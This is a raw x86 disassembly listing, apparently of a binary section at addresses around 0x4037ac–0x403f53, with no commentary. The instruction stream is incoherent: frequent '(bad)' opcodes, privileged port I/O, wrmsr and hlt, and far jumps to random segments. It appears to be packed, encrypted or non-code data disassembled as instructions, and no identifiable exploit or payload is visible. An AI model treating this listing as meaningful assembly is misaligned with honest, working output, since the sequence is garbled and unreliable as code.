  4037ac:	je     0x40376c
  4037ae:	icebp  
  4037af:	mov    ?,WORD PTR [esi+0xd067edb]
  4037b5:	adc    eax,0x9941362a
  4037ba:	nop
  4037bb:	data16 fnstsw WORD PTR [edi-0x408c9b3e]
  4037c2:	lds    esp,FWORD PTR [ecx]
  4037c4:	rol    DWORD PTR [edi+0x30],cl
  4037c7:	sar    eax,1
  4037c9:	ss pusha 
  4037cb:	pop    esi
  4037cc:	mov    ebp,0x4345ec80
  4037d1:	jmp    0xba9f:0xf37c7688
  4037d8:	push   ebp
  4037d9:	jae    0x403765
  4037db:	enter  0xa78b,0xf5
  4037df:	pop    edi
  4037e0:	retf   0x4d7
  4037e3:	xchg   ebp,eax
  4037e4:	inc    ecx
  4037e5:	xchg   ebx,eax
  4037e6:	in     al,dx
  4037e7:	pop    ebp
  4037e8:	out    dx,eax
  4037e9:	lods   eax,DWORD PTR ds:[esi]
  4037ea:	data16 jg 0x403858
  4037ed:	add    eax,0xa0628840
  4037f2:	mov    eax,0x71ba2038
  4037f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037f8:	mov    dl,0x61
  4037fa:	out    0x1d,eax
  4037fc:	mov    gs,WORD PTR [edx+eiz*1+0x56d945f1]
  403803:	test   eax,0x2aa2822
  403808:	push   edi
  403809:	jmp    0xc6ae:0xce308717
  403810:	sub    eax,0x77fbff80
  403815:	aam    0xb0
  403817:	xor    esp,DWORD PTR [esi+0x3c436037]
  40381d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40381e:	sbb    BYTE PTR [ebx],0xcf
  403821:	call   0x30a9:0xd615306
  403828:	loopne 0x403871
  40382a:	xor    DWORD PTR [ebp-0x5add5515],edi
  403830:	jp     0x40382b
  403832:	ins    DWORD PTR es:[edi],dx
  403833:	or     DWORD PTR [edi-0x34ec8198],edx
  403839:	nop
  40383a:	xchg   edx,eax
  40383b:	pop    ds
  40383c:	mov    ecx,0xf40f61a4
  403841:	jg     0x4038a7
  403843:	and    dl,BYTE PTR [ebx+0x49]
  403846:	fsubr  QWORD PTR [eax+esi*2-0x36]
  40384a:	sahf   
  40384b:	xchg   ebp,eax
  40384c:	sbb    al,0xd1
  40384e:	outs   dx,DWORD PTR ds:[esi]
  40384f:	int    0xf9
  403851:	sub    BYTE PTR [ebx-0x1be37197],bh
  403857:	add    BYTE PTR ds:0x106704c8,0x24
  40385e:	clc    
  40385f:	xchg   BYTE PTR [edx+0x5a],ah
  403862:	push   ebp
  403863:	mov    cl,0x16
  403865:	pop    ebp
  403866:	pop    ecx
  403867:	addr16 sbb eax,0xe4eec05a
  40386d:	xchg   DWORD PTR [ebp-0x6f97d60f],ebx
  403873:	adc    eax,0x3c5a654b
  403878:	jns    0x40381d
  40387a:	loope  0x403803
  40387c:	add    bh,ch
  40387e:	mov    ds:0x39d24805,al
  403883:	mov    ds:0x6b9aee54,eax
  403888:	xor    dh,bh
  40388a:	loopne 0x403867
  40388c:	arpl   WORD PTR [esi+edx*4],bx
  40388f:	outs   dx,BYTE PTR ds:[esi]
  403890:	fadd   st,st(7)
  403892:	or     esi,DWORD PTR [ebp+0x55]
  403895:	out    dx,al
  403896:	mov    ds,ecx
  403898:	hlt    
  403899:	(bad)  
  40389a:	jns    0x40390e
  40389c:	mov    ds:0xc27be741,eax
  4038a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038a2:	int3   
  4038a3:	adc    cl,bl
  4038a5:	cld    
  4038a6:	(bad)  [ebp+edx*2-0x1def54b7]
  4038ad:	das    
  4038ae:	jb     0x403847
  4038b0:	push   ebx
  4038b1:	cmp    eax,0xf08b40f4
  4038b6:	and    esi,esi
  4038b8:	jns    0x403862
  4038ba:	cld    
  4038bb:	jmp    0x18f49eeb
  4038c0:	sbb    eax,0x7a6fa802
  4038c5:	sahf   
  4038c6:	inc    ebx
  4038c7:	sbb    eax,0x5f0fb8ee
  4038cc:	sbb    al,0x52
  4038ce:	push   0x2807f6a8
  4038d3:	and    eax,0xee1ebbdb
  4038d8:	scas   eax,DWORD PTR es:[edi]
  4038d9:	(bad)  
  4038da:	jbe    0x4038fb
  4038dc:	(bad)  
  4038dd:	cld    
  4038de:	in     eax,0x89
  4038e0:	(bad)
  4038e4:	lds    eax,FWORD PTR [ebp+0x507fe8d1]
  4038ea:	stos   DWORD PTR es:[edi],eax
  4038eb:	out    0x56,al
  4038ed:	jmp    0x903b:0x972a8708
  4038f4:	cmc    
  4038f5:	and    esp,esi
  4038f7:	inc    bp
  4038f9:	add    al,0x18
  4038fb:	pushf  
  4038fc:	leave  
  4038fd:	pop    eax
  4038fe:	retf   0xf9dc
  403901:	call   0xaf10:0xb4c41416
  403908:	jmp    0x4038d9
  40390a:	push   eax
  40390b:	mov    esi,0x9158701c
  403910:	pop    ecx
  403911:	adc    esi,DWORD PTR [eax+edi*8+0x18]
  403915:	je     0x4038b8
  403917:	xor    eax,0x6b60cbd4
  40391c:	mov    ch,0xb7
  40391e:	icebp  
  40391f:	dec    esi
  403920:	jne    0x4038bb
  403922:	inc    eax
  403923:	push   edx
  403924:	add    dl,BYTE PTR [esi]
  403926:	outs   dx,DWORD PTR ds:[esi]
  403927:	mov    ds:0x14286b67,al
  40392c:	pop    edi
  40392d:	inc    edx
  40392e:	dec    eax
  40392f:	sahf   
  403930:	fs retf 0x268f
  403934:	ret    0xbaff
  403937:	cmp    eax,0x3550761e
  40393c:	add    ah,cl
  40393e:	jmp    0x3c3e:0x807abb5a
  403945:	das    
  403946:	pop    es
  403947:	clc    
  403948:	aaa    
  403949:	lds    edi,FWORD PTR [ebx]
  40394b:	enter  0xa800,0xc1
  40394f:	pop    edi
  403950:	inc    esi
  403951:	xchg   esp,eax
  403952:	mov    bl,0x4b
  403954:	push   0xe29eb185
  403959:	popf   
  40395a:	xchg   DWORD PTR fs:[ebx+0x35],ebx
  40395e:	push   ds
  40395f:	aam    0x98
  403961:	ins    BYTE PTR es:[edi],dx
  403962:	stos   DWORD PTR es:[edi],eax
  403963:	pop    edi
  403964:	repz xchg edi,eax
  403966:	sbb    DWORD PTR [ebx+0x5c],esi
  403969:	xchg   esi,eax
  40396a:	push   ds
  40396b:	loopne 0x4038fd
  40396d:	call   0x9df8efbc
  403972:	sub    ch,BYTE PTR [ebx+edi*2+0x21a74f88]
  403979:	cmp    eax,0xf82db12b
  40397e:	in     eax,dx
  40397f:	jl     0x403993
  403981:	mov    dl,0xc4
  403983:	fs lahf 
  403985:	loopne 0x403915
  403987:	or     ebx,edx
  403989:	cwde   
  40398a:	loop   0x40396c
  40398c:	pushf  
  40398d:	cmp    BYTE PTR [eax+ebx*1],dh
  403990:	jns    0x403920
  403992:	and    DWORD PTR [edi],ebx
  403994:	xchg   esp,eax
  403995:	and    eax,DWORD PTR [eax-0xdf34d9a]
  40399b:	(bad)  
  40399c:	jg     0x403948
  40399e:	retf   0xa069
  4039a1:	inc    ecx
  4039a2:	mov    ecx,0xcd71bf52
  4039a7:	dec    esi
  4039a8:	test   BYTE PTR [edx+0x46],ah
  4039ab:	inc    esi
  4039ac:	mov    dl,0x59
  4039ae:	dec    ebp
  4039af:	inc    eax
  4039b0:	sub    cl,BYTE PTR [esi]
  4039b2:	fs jne 0x403a2e
  4039b5:	call   0xbe80:0xe77b3fab
  4039bc:	cmp    eax,0xb8833031
  4039c1:	jne    0x4039ff
  4039c3:	xor    esi,DWORD PTR [edi-0x6904c017]
  4039c9:	and    al,0x74
  4039cb:	jbe    0x403a39
  4039cd:	xchg   ecx,eax
  4039ce:	out    0x6b,eax
  4039d0:	les    di,DWORD PTR [esi]
  4039d3:	xchg   ah,ah
  4039d5:	inc    esp
  4039d6:	stos   BYTE PTR es:[edi],al
  4039d7:	in     al,dx
  4039d8:	jl     0x403977
  4039da:	inc    ecx
  4039db:	pop    ebp
  4039dc:	bound  edi,QWORD PTR [ecx-0x79]
  4039df:	push   ebx
  4039e0:	loopne 0x403a1f
  4039e2:	hlt    
  4039e3:	psrad  mm7,QWORD PTR [eax+0x27ed74f8]
  4039ea:	retf   0xfbf5
  4039ed:	mov    bh,0x61
  4039ef:	pop    ebp
  4039f0:	add    bl,ah
  4039f2:	add    ch,BYTE PTR [ebx]
  4039f4:	data16 or al,0xf9
  4039f7:	pop    ebp
  4039f8:	lea    ecx,[edi]
  4039fa:	push   ebx
  4039fb:	cmp    BYTE PTR [eax-0x47baafed],bh
  403a01:	jl     0x4039fc
  403a03:	fs mov edx,0x16904140
  403a09:	xchg   esi,eax
  403a0a:	jne    0x403a32
  403a0c:	icebp  
  403a0d:	imul   BYTE PTR [esp+ebx*2+0x2c]
  403a11:	in     al,0x91
  403a13:	call   0x75db92a8
  403a18:	retf   0xcc51
  403a1b:	ss jb  0x4039be
  403a1e:	test   DWORD PTR [edx+0x6b87843f],eax
  403a24:	or     DWORD PTR [edx+0x2f],eax
  403a27:	popa   
  403a28:	fwait
  403a29:	and    al,0xd5
  403a2b:	mov    dh,0xb6
  403a2d:	nop
  403a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a2f:	wrmsr  
  403a31:	ret    0x2b1b
  403a34:	jmp    0x584a6c
  403a39:	push   esp
  403a3a:	sbb    DWORD PTR ds:0xc0e64c3,ebx
  403a40:	dec    esp
  403a41:	cld    
  403a42:	stos   DWORD PTR es:[edi],eax
  403a43:	je     0x403abb
  403a45:	jmp    0x94a449bb
  403a4a:	jl     0x403abd
  403a4c:	bound  ecx,QWORD PTR [eax+ecx*2+0x5b]
  403a50:	pop    ss
  403a51:	scas   al,BYTE PTR es:[edi]
  403a52:	inc    esi
  403a53:	xchg   esp,eax
  403a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a55:	ja     0x403ac5
  403a57:	sar    DWORD PTR [ebx-0x5c],0xa5
  403a5b:	dec    ebx
  403a5c:	xchg   edx,eax
  403a5d:	lock jmp 0xabe1:0x7f4b2d9b
  403a65:	in     al,0x57
  403a67:	jne    0x403ab3
  403a69:	enter  0xf47,0x74
  403a6d:	mov    bh,0x2d
  403a6f:	xchg   ecx,eax
  403a70:	xchg   ebp,eax
  403a71:	cmp    DWORD PTR [edi],ebp
  403a73:	ins    BYTE PTR es:[edi],dx
  403a74:	push   edx
  403a75:	dec    eax
  403a76:	push   edi
  403a77:	(bad)  
  403a78:	(bad)  
  403a79:	addr16 mov eax,0x5556f2a7
  403a7f:	or     al,0x98
  403a81:	sub    DWORD PTR [eax-0x72],0xb38f9def
  403a88:	(bad)  
  403a89:	push   ss
  403a8a:	stos   DWORD PTR es:[edi],eax
  403a8b:	and    edi,DWORD PTR [ebx-0x6a]
  403a8e:	and    eax,0x6d7e5a7a
  403a93:	pop    es
  403a94:	adc    dh,al
  403a96:	jo     0x403a9f
  403a98:	push   esi
  403a99:	mov    gs,WORD PTR [ebx]
  403a9b:	inc    ebx
  403a9c:	cli    
  403a9d:	sub    eax,eax
  403a9f:	pop    ebx
  403aa0:	dec    esp
  403aa1:	add    eax,0x891abd1f
  403aa6:	test   eax,0x4abff891
  403aab:	retf   0x965e
  403aae:	sbb    BYTE PTR [edi],dl
  403ab0:	idiv   DWORD PTR [esi+edi*2-0x45243260]
  403ab7:	call   0x1d5355e
  403abc:	lods   al,BYTE PTR ds:[esi]
  403abd:	jmp    0xb364:0x6318d87c
  403ac4:	mov    al,ds:0xa83e71f
  403ac9:	lods   al,BYTE PTR ds:[esi]
  403aca:	push   es
  403acb:	shr    ebx,1
  403acd:	add    edi,ebp
  403acf:	mov    bh,0xcb
  403ad1:	loope  0x403a69
  403ad3:	in     al,dx
  403ad4:	add    eax,0x3e8f7c6e
  403ad9:	pop    es
  403ada:	mov    edi,0xd89828dd
  403adf:	jg     0x403a72
  403ae1:	push   eax
  403ae2:	js     0x403a6b
  403ae4:	mov    al,0x1e
  403ae6:	pop    esi
  403ae7:	in     al,dx
  403ae8:	pop    es
  403ae9:	and    al,0xb
  403aeb:	outs   dx,DWORD PTR ds:[esi]
  403aec:	xlat   BYTE PTR ds:[ebx]
  403aed:	fwait
  403aee:	rol    DWORD PTR [edi-0x63bb63ab],cl
  403af4:	dec    esp
  403af5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403af6:	not    DWORD PTR [edi]
  403af8:	jb     0x403ae5
  403afa:	loop   0x403acd
  403afc:	mov    eax,DWORD PTR [esi+0x61e3b1e0]
  403b02:	jmp    0x403af9
  403b04:	add    DWORD PTR ds:0x6b95fe73,ecx
  403b0a:	(bad)  
  403b0b:	popf   
  403b0c:	jle    0x403a94
  403b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b0f:	cli    
  403b10:	mov    cl,0x36
  403b12:	dec    eax
  403b13:	push   cs
  403b14:	das    
  403b15:	or     bl,BYTE PTR ds:0x89465ad6
  403b1b:	fld    TBYTE PTR [ebp+0x29]
  403b1e:	cli    
  403b1f:	cmp    al,0xe6
  403b21:	mov    bh,0x47
  403b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b24:	add    eax,0x2a2b7d3f
  403b29:	(bad)  
  403b2a:	stc    
  403b2b:	jmp    0xc0d55087
  403b30:	xor    ebx,eax
  403b32:	inc    edx
  403b33:	dec    edi
  403b34:	jae    0x403b35
  403b36:	add    cl,bh
  403b38:	(bad)  [edx]
  403b3a:	push   ecx
  403b3b:	inc    esi
  403b3c:	lods   al,BYTE PTR ds:[esi]
  403b3d:	cwde   
  403b3e:	les    ebp,FWORD PTR fs:[esi-0xb578714]
  403b45:	add    cl,BYTE PTR [ecx+0x1f]
  403b48:	adc    cl,bl
  403b4a:	mov    eax,DWORD PTR [edx+0x7f]
  403b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b4e:	repnz and edx,esi
  403b51:	js     0x403b10
  403b53:	mov    DWORD PTR [eax],0xbfff0777
  403b59:	push   cs
  403b5a:	cdq    
  403b5b:	xor    esi,DWORD PTR gs:[edx]
  403b5e:	jmp    0x403b70
  403b60:	jo     0x403b9d
  403b62:	shl    DWORD PTR [ebx+0x713563b3],1
  403b68:	inc    eax
  403b69:	inc    ecx
  403b6a:	dec    ebp
  403b6b:	and    eax,0x96311713
  403b70:	xlat   BYTE PTR ds:[ebx]
  403b71:	add    eax,0xf4259d52
  403b76:	pop    eax
  403b77:	or     DWORD PTR [edx-0x2b547954],esi
  403b7d:	xchg   BYTE PTR [ebx-0x4ae34a71],ch
  403b83:	test   al,0x6a
  403b85:	test   eax,0x856c6fb2
  403b8a:	cmp    edi,esp
  403b8c:	mov    ebx,0xf8a8ce62
  403b91:	dec    esi
  403b92:	shl    al,1
  403b94:	and    dl,BYTE PTR [eax]
  403b96:	ss retf 
  403b98:	call   0xd078:0x8188c6dc
  403b9f:	loope  0x403bf1
  403ba1:	mov    BYTE PTR [esi+ebx*8-0x13518f9a],cl
  403ba8:	ret    0x40f1
  403bab:	mov    ah,0xfb
  403bad:	lea    ecx,[ebp+0x4a]
  403bb0:	cmp    ebx,DWORD PTR [edi-0x12c4bbe4]
  403bb6:	(bad)  
  403bb8:	inc    esp
  403bb9:	pop    ecx
  403bba:	mov    eax,0xd8791651
  403bbf:	and    DWORD PTR [ecx-0x648fa93b],0x9ea5571d
  403bc9:	sbb    al,ch
  403bcb:	fs imul edx,ebx,0x32
  403bcf:	aaa    
  403bd0:	(bad)  
  403bd2:	shl    BYTE PTR [esi-0x3b],1
  403bd5:	(bad)  [ebp+esi*2+0x46]
  403bd9:	hlt    
  403bda:	sbb    dl,BYTE PTR [ebp-0x3ec3763d]
  403be0:	sbb    BYTE PTR [ebx],bh
  403be2:	xor    al,0x66
  403be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403be5:	int3   
  403be6:	retf   
  403be7:	fxch   st(4)
  403be9:	fwait
  403bea:	lar    esp,WORD PTR [edx-0x3b]
  403bee:	cmp    edi,eax
  403bf0:	lods   al,BYTE PTR ds:[esi]
  403bf1:	stos   BYTE PTR es:[edi],al
  403bf2:	nop
  403bf3:	cli    
  403bf4:	cmp    BYTE PTR [ecx-0x16e57e08],cl
  403bfa:	and    DWORD PTR [ebx+eax*8-0x58],ebx
  403bfe:	scas   al,BYTE PTR es:[edi]
  403bff:	push   0x55
  403c01:	jge    0x403bfb
  403c03:	scas   eax,DWORD PTR es:[edi]
  403c04:	pop    eax
  403c05:	jbe    0x403bc3
  403c07:	ss (bad) 
  403c09:	cmp    eax,0x1cf78968
  403c0e:	push   ss
  403c0f:	loope  0x403c6e
  403c11:	push   ds
  403c12:	dec    ecx
  403c13:	adc    edi,eax
  403c15:	xlat   BYTE PTR ds:[ebx]
  403c16:	or     BYTE PTR [ecx],cl
  403c18:	(bad)
  403c1b:	es ins DWORD PTR es:[edi],dx
  403c1d:	push   edx
  403c1e:	pop    ds
  403c1f:	repz (bad) 
  403c21:	es mov ebx,0x9586e35c
  403c27:	ss cli 
  403c29:	cmp    al,0x89
  403c2b:	mov    esi,0x558b5582
  403c30:	mov    ds:0xd7ef5bed,eax
  403c35:	cmp    eax,0x51d134f9
  403c3a:	mov    edx,0xcdcf56a4
  403c3f:	adc    BYTE PTR [esi-0x7d9aa0f4],bl
  403c45:	(bad)  
  403c46:	ss into 
  403c48:	rcl    al,1
  403c4a:	xchg   esp,eax
  403c4b:	cmp    BYTE PTR [ecx],ah
  403c4d:	adc    cl,BYTE PTR [edx+eax*8-0x27]
  403c51:	icebp  
  403c52:	and    bh,BYTE PTR [edi-0x7c]
  403c55:	adc    eax,0x796ddb20
  403c5a:	xlat   BYTE PTR ds:[ebx]
  403c5b:	leave  
  403c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c5d:	ror    DWORD PTR [ecx],cl
  403c5f:	mov    al,ds:0x62c1afda
  403c64:	push   edx
  403c65:	adc    DWORD PTR [ecx+0x6e],eax
  403c68:	inc    ecx
  403c69:	adc    al,0xdf
  403c6b:	jge    0x403c1e
  403c6d:	outs   dx,DWORD PTR ds:[esi]
  403c6e:	dec    sp
  403c70:	xor    al,0xc
  403c72:	push   0x49
  403c74:	mov    edx,0xba076f57
  403c79:	mov    esi,0x3f9339fc
  403c7e:	inc    ebp
  403c7f:	in     al,dx
  403c80:	out    0x29,eax
  403c82:	scas   eax,DWORD PTR es:[edi]
  403c83:	dec    esp
  403c84:	mov    cl,0xef
  403c86:	jl     0x403cbe
  403c88:	pop    eax
  403c89:	div    DWORD PTR [edx-0x5]
  403c8c:	bound  edi,QWORD PTR [esi+ecx*2+0x49e664d]
  403c93:	mov    dh,0xc8
  403c95:	add    bl,ch
  403c97:	mov    bh,0x3d
  403c99:	pop    eax
  403c9a:	shl    BYTE PTR [esp+esi*8],1
  403c9d:	add    BYTE PTR [eax-0x7f],dl
  403ca0:	fwait
  403ca1:	icebp  
  403ca2:	sub    al,0x4d
  403ca4:	add    BYTE PTR [ecx+0x63],bh
  403ca7:	sbb    BYTE PTR [eax+0x1838e694],ah
  403cad:	inc    ecx
  403cae:	cld    
  403caf:	retf   0xd612
  403cb2:	es ins BYTE PTR es:[edi],dx
  403cb4:	and    esi,DWORD PTR [ebx]
  403cb6:	or     cl,BYTE PTR [ecx]
  403cb8:	xor    DWORD PTR [edx-0x5],0x58
  403cbc:	in     eax,0xde
  403cbe:	imul   esi,esp,0xc543d82
  403cc4:	jne    0x403cbd
  403cc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cc7:	xchg   DWORD PTR [ecx],edx
  403cc9:	and    DWORD PTR [ebx],ebp
  403ccb:	fisubr WORD PTR [esi-0x55db6d01]
  403cd1:	xchg   ebx,eax
  403cd2:	pop    ebp
  403cd3:	stos   DWORD PTR es:[edi],eax
  403cd4:	push   cs
  403cd5:	and    al,0x7c
  403cd7:	pop    esi
  403cd8:	lahf   
  403cd9:	pop    ebx
  403cda:	arpl   WORD PTR ds:0xc8692143,si
  403ce0:	xor    al,BYTE PTR [edx-0x1d6ae3c3]
  403ce6:	pop    ss
  403ce7:	push   ss
  403ce8:	dec    esp
  403ce9:	in     al,0x62
  403ceb:	leave  
  403cec:	inc    esi
  403ced:	sar    DWORD PTR [edi],cl
  403cef:	dec    ebx
  403cf0:	dec    ebx
  403cf1:	fidiv  WORD PTR [edi-0x2c]
  403cf4:	neg    DWORD PTR [ebp-0x1775159c]
  403cfa:	pop    esi
  403cfb:	xchg   ebp,eax
  403cfc:	ins    DWORD PTR es:[edi],dx
  403cfd:	shr    cl,0xcd
  403d00:	(bad)  [esi-0x7a835f91]
  403d06:	xchg   BYTE PTR [eax+0x21],dh
  403d09:	mov    dl,0x2e
  403d0b:	push   ebx
  403d0c:	sub    BYTE PTR [ebx],bh
  403d0e:	mov    al,0xe7
  403d10:	push   edx
  403d11:	pop    esp
  403d12:	add    eax,0x7f03e415
  403d17:	mov    BYTE PTR [ecx+0x43],bl
  403d1a:	dec    edx
  403d1b:	cdq    
  403d1c:	js     0x403cfd
  403d1e:	test   eax,0x40a1a243
  403d23:	inc    ecx
  403d24:	xlat   BYTE PTR ds:[ebx]
  403d25:	fild   WORD PTR [ecx]
  403d27:	nop
  403d28:	push   eax
  403d29:	cwde   
  403d2a:	dec    esi
  403d2b:	bound  esp,QWORD PTR [edi]
  403d2d:	sahf   
  403d2e:	test   eax,0xf5493148
  403d33:	test   DWORD PTR [esi+0x6a47322c],0x79a4335c
  403d3d:	sbb    al,0xeb
  403d3f:	or     al,0xda
  403d41:	push   esi
  403d42:	fild   DWORD PTR [esi+0x6c]
  403d45:	ins    DWORD PTR es:[edi],dx
  403d46:	xor    dh,BYTE PTR [edx+0x7b2cf686]
  403d4c:	xchg   DWORD PTR [esi+eax*8-0x1c],edx
  403d50:	fcmovnb st,st(2)
  403d52:	repz or edi,DWORD PTR [esi]
  403d55:	ficom  DWORD PTR [edi+0x69bff3cb]
  403d5b:	gs in  al,dx
  403d5d:	inc    esp
  403d5e:	ficom  DWORD PTR ds:0x36bafbc3
  403d64:	adc    ah,bl
  403d66:	jo     0x403d64
  403d68:	mov    dh,0x23
  403d6a:	ins    BYTE PTR es:[edi],dx
  403d6b:	mov    al,BYTE PTR [edi+0x54]
  403d6e:	push   edx
  403d6f:	mov    edi,0x5972f8d9
  403d74:	or     DWORD PTR [ecx+eax*4-0x4391d0d5],esi
  403d7b:	and    BYTE PTR [ebp+0x54],ah
  403d7e:	das    
  403d7f:	stos   DWORD PTR es:[edi],eax
  403d80:	dec    esp
  403d81:	retf   0xa51
  403d84:	jns    0x403dff
  403d86:	pop    ecx
  403d87:	jmp    0x403d29
  403d89:	int3   
  403d8a:	or     al,0x50
  403d8c:	in     eax,dx
  403d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d8e:	or     dl,BYTE PTR [edi]
  403d90:	mov    ds,WORD PTR ds:0x87d49696
  403d96:	cmc    
  403d97:	out    0x86,eax
  403d99:	adc    ebp,edi
  403d9b:	aam    0x63
  403d9d:	push   edi
  403d9e:	adc    al,0x3
  403da0:	and    al,BYTE PTR [ecx-0x6c9b34c6]
  403da6:	and    eax,0xa67cd077
  403dab:	retf   0x180f
  403dae:	inc    ecx
  403daf:	aam    0xa7
  403db1:	sbb    eax,0x94b94057
  403db6:	lahf   
  403db7:	pop    ss
  403db8:	scas   eax,DWORD PTR es:[edi]
  403db9:	cdq    
  403dba:	jne    0x403e21
  403dbc:	imul   BYTE PTR [edx+0x1b2ba712]
  403dc2:	loopne 0x403d6a
  403dc4:	push   0xffffffc0
  403dc6:	call   0x19f3:0x143ebc89
  403dcd:	xchg   DWORD PTR [ecx-0x4e96c967],ebp
  403dd3:	in     eax,0xc0
  403dd5:	outs   dx,DWORD PTR ds:[esi]
  403dd6:	or     esi,DWORD PTR [ebx+0x172dfdec]
  403ddc:	sbb    BYTE PTR [ebp+0x781a9952],bl
  403de2:	std    
  403de3:	cli    
  403de4:	jecxz  0x403dfa
  403de6:	mov    eax,ds:0x164a8fc4
  403deb:	xchg   esi,eax
  403dec:	sub    dl,BYTE PTR [eax-0xe]
  403def:	cmp    eax,eax
  403df1:	sbb    al,0xdb
  403df3:	adc    bh,dl
  403df5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403df6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403df7:	xchg   ebx,eax
  403df8:	ror    bl,cl
  403dfa:	cmp    bh,BYTE PTR [ebp+0x5e]
  403dfd:	pop    esi
  403dfe:	jge    0x403dc3
  403e00:	xchg   DWORD PTR [eax],edi
  403e02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e03:	inc    edx
  403e04:	push   ecx
  403e05:	sub    al,BYTE PTR [ecx-0x54fddb4a]
  403e0b:	mov    bh,0x28
  403e0d:	imul   ebx,edi,0x55
  403e10:	sbb    al,0x66
  403e13:	fidiv  DWORD PTR [ebx+0x31]
  403e16:	ret    0xdb0d
  403e19:	fild   WORD PTR [edx+0x5d00c3fc]
  403e1f:	cmp    al,BYTE PTR [ebx+ebp*2+0x3e92e994]
  403e26:	push   es
  403e27:	sbb    edi,DWORD PTR [edx]
  403e29:	or     BYTE PTR [esp+esi*8-0x9016b87],dh
  403e30:	mov    ch,0x23
  403e32:	mov    fs,WORD PTR [ecx]
  403e34:	pop    ds
  403e35:	or     al,0x6
  403e37:	sub    DWORD PTR [eax-0x270918d0],0xea290c3a
  403e41:	es sub edi,edx
  403e44:	sub    dh,cl
  403e46:	xchg   ebx,eax
  403e47:	aam    0x53
  403e49:	xlat   BYTE PTR ds:[ebx]
  403e4a:	sub    eax,0xad70f71d
  403e4f:	dec    esp
  403e50:	inc    DWORD PTR [esi+edi*4-0x6d8bd3c7]
  403e57:	lds    esi,FWORD PTR [eax-0x579c4d25]
  403e5d:	xchg   dh,cl
  403e5f:	cli    
  403e60:	iret   
  403e61:	outs   dx,BYTE PTR ds:[esi]
  403e62:	sbb    DWORD PTR [ebp+0x4d832f35],edx
  403e68:	hlt    
  403e69:	cdq    
  403e6a:	(bad)  
  403e6b:	push   ecx
  403e6c:	dec    edx
  403e6d:	nop
  403e6e:	cwde   
  403e6f:	ja     0x403e5b
  403e71:	pusha  
  403e72:	and    al,0x1
  403e74:	(bad)  
  403e75:	repz in al,0xc
  403e78:	retf   
  403e79:	jnp    0x403ee9
  403e7b:	xchg   DWORD PTR [ebp-0x43],edx
  403e7e:	sub    ebp,DWORD PTR [ebp+esi*8-0x79]
  403e82:	push   ebp
  403e83:	scas   al,BYTE PTR es:[edi]
  403e84:	mov    ?,WORD PTR [ecx]
  403e86:	ret    0x4c80
  403e89:	retf   0xa7d0
  403e8c:	sbb    eax,0x990c1c82
  403e91:	arpl   WORD PTR [esi+0x15c34664],si
  403e97:	xor    DWORD PTR [ebp-0x19ae68e8],ebp
  403e9d:	imul   ebx,DWORD PTR [ecx+0x41f351df],0x2b
  403ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea5:	es out dx,al
  403ea7:	pop    es
  403ea8:	mov    edi,0x2fec5fc
  403ead:	ret    
  403eae:	mov    cl,0x41
  403eb0:	arpl   WORD PTR [ebx+0x57e8a6e2],dx
  403eb6:	push   ecx
  403eb7:	cmp    ebx,ebp
  403eb9:	outs   dx,BYTE PTR ds:[esi]
  403eba:	jno    0x403ee1
  403ebc:	cld    
  403ebd:	cmc    
  403ebe:	or     DWORD PTR [ecx],ecx
  403ec0:	xchg   ebp,eax
  403ec1:	dec    ecx
  403ec2:	and    al,0x72
  403ec4:	adc    ecx,DWORD PTR [esi+ebp*8+0x15]
  403ec8:	stc    
  403ec9:	dec    ebp
  403eca:	cmc    
  403ecb:	pop    edx
  403ecc:	xchg   esp,eax
  403ecd:	and    ch,BYTE PTR [ebx+0x437aac20]
  403ed3:	lods   al,BYTE PTR ds:[esi]
  403ed4:	jg     0x403ec8
  403ed6:	mov    ch,0xa7
  403ed8:	nop
  403ed9:	jo     0x403e6a
  403edb:	sbb    al,BYTE PTR [esi+0x7a07c2db]
  403ee1:	and    BYTE PTR [edx-0x62],bl
  403ee4:	mov    ebx,0x5e22c3d1
  403ee9:	loop   0x403f42
  403eeb:	sbb    DWORD PTR [edi-0x43],eax
  403eee:	jecxz  0x403e8f
  403ef0:	xchg   ebp,eax
  403ef1:	xchg   edx,eax
  403ef2:	mov    ch,0xf3
  403ef4:	push   edi
  403ef5:	jl     0x403e88
  403ef7:	bound  edi,QWORD PTR [edx]
  403ef9:	in     eax,0xf6
  403efb:	or     ecx,DWORD PTR [ebx-0x4a75e998]
  403f01:	aad    0x39
  403f03:	jge    0x403f82
  403f05:	sar    esp,1
  403f07:	mov    edx,0x54f5c31
  403f0c:	xchg   ecx,eax
  403f0d:	pop    ecx
  403f0e:	enter  0x3671,0x6c
  403f12:	cld    
  403f13:	ss mov cl,0xba
  403f16:	rcl    DWORD PTR [edi-0x4],cl
  403f19:	je     0x403f5b
  403f1b:	(bad)  
  403f1c:	imul   edx,eax,0xe6d6a856
  403f22:	call   0x53c16bee
  403f27:	pusha  
  403f28:	fldcw  WORD PTR [ebx+eax*1-0x7b]
  403f2c:	stc    
  403f2d:	mov    esi,0x9e59a1b7
  403f32:	in     al,0xd5
  403f34:	test   BYTE PTR [ebx],cl
  403f36:	jo     0x403eba
  403f38:	clc    
  403f39:	in     al,dx
  403f3a:	punpcklwd mm6,DWORD PTR ds:0x145458c0
  403f41:	ficomp DWORD PTR [ebp+0x62be747a]
  403f47:	and    al,0xb6
  403f49:	in     al,0xf0
  403f4b:	dec    esi
  403f4c:	jge    0x403ede
  403f4e:	pop    ebp
  403f4f:	jecxz  0x403f05
  403f51:	push   0xffffffad
  403f53:	loopne 0x403f27
